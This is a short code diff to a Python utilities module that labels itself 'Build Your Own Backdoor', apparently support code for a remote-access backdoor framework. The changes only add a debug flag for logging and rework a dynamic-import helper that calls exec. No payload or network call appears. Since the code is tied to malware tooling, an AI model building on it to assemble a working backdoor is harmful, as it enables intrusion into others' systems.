@@ -2,6 +2,8 @@
 # -*- coding: utf-8 -*-
 'Utilities (Build Your Own Backdoor)'
 
+_debug = False
+
 # main
 def log(info, level='debug'):
     """ 
@@ -9,33 +11,34 @@ def log(info, level='debug'):
 
     """
     import logging
-    logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
+    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handler=logging.StreamHandler())
     logger = logging.getLogger(__name__)
     getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))
 
-def imports(packages, target=None):
+def imports(source, target=None):
     """ 
     Attempt to import each package into the module specified
 
     `Required`
-    :param list packages: list of packages to import
+    :param list source: package/module to import
 
     `Optional`
     :param object target: target object/module to import into 
 
     """
-    module = globals()
-    if isinstance(packages, str):
-        packages = [packages]
+    if isinstance(source, str):
+        source = source.split()
     if isinstance(target, dict):
         module = target
     elif hasattr(target, '__dict__'):
         module = target.__dict__
-    for package in packages:
+    else:
+        module = globals()
+    for src in source:
         try:
-            exec("import {}".format(package), target)
+            exec "import {}".format(src) in target
         except ImportError:
-            log("missing package '{}' is required".format(package))
+            log("missing package '{}' is required".format(source))
 
 def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     """ 
